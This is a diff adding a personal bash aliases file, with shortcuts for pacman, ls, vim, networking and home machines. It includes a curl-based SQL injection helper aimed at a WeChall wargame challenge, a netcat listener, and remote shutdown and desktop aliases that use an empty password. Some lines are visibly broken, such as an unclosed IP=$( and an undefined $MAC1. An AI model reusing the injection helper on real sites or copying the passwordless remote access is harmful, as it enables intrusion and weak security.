@@ -1,0 +1,82 @@
+alias alsource='source /etc/bash_aliases'
+alias resource='source /etc/bash.bashrc'
+alias sf='pacman -Ss'
+alias install='pacman -S'
+alias pacman='pacman-color'
+alias vibash='vim ~/.bashrc'
+alias virc='vim /etc/rc.conf'
+
+alias mv='mv -vi'
+alias cp='cp -vi'
+alias rm='rm -vi'
+alias rmq='/bin/rm'
+alias rmr='rm -rv'
+alias mkdir='mkdir -pv'
+alias ..='cd ..'
+alias cd.='cd ..'
+alias h='history'
+alias j='jobs -l'
+alias L='less'
+alias grep='grep --colour=always'
+alias cl='clear; ls'
+alias du='du -kh'
+alias df='df -kThlx tmpfs'
+
+alias e='vim'
+alias vi='vim'
+alias diff='diff -u'
+alias dch='dch -i --no-auto-nmu'
+alias ping='ping -c1'
+alias free='free -m'
+alias sudo='su -c root'
+alias x="tar -xvf"
+alias wget='wget --referer="http://www.google.com" --user-agent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/9"'
+alias weechat='weechat-curses'
+
+alias ls='ls -hA --color=auto --group-directories-first'
+alias la='ls -af'
+alias lla='ls -afl'
+alias ll='ls -fl'
+alias l='ls -cf'
+alias lr='ls -lR'
+alias lc='ls -ltcr'
+alias lu='ls -ltur'
+alias tree='tree -Csu'
+
+alias rlm='readlink -m'
+alias scr='exec screen -xrr'
+alias topu='top -u "$user"'
+alias grephist='history | grep'
+alias lesshist='history | less'
+
+alias rootbind='sshfs florianbest.de:/home/spaceone ~/florianbest.de/'
+alias GWFco='svn co https://svn.gwf3.gizmore.org/GWF3'
+alias startlamp='/etc/rc.d/httpd start && /etc/rc.d/mysqld start'
+
+IP=$(/sbin/ifconfig eth0 | awk '/inet / { print $2 }'
+alias ncl="nc -l $IP"
+
+MAC='50:e5:49:30:b9:94'
+MAC2='00:30:05:1E:68:FA'
+IP1='192.168.178.23'
+IP2='192.168.178.24'
+alias wakemom="wol $MAC1"
+alias wakeluke="wol $MAC2"
+alias sdmom="net rpc shutdown -t 0 -f -I 192.168.178.23 -U susanne%"
+alias vncmom='rdesktop -g 1275x1000 -k de -u susanne -p "" susanne'
+
+function msgLuke() { # TODO: optimize
+ssh luke@Lukas "DISPLAY=:0.0;export DISPLAY;zenity --info --text $1" && echo DONE;
+}
+
+function mkcd () {
+  mkdir -p "$1"
+  cd "$1"
+}
+function psgrep () {
+  ps aux | grep "$1" | grep -v "grep"
+}
+
+function inj() {
+curl -i --data "inject=Inject&injection=foo') union select $1" 'http://www.wechall.net/challenge/blind_light/index.php' #| tail -n 52
+}
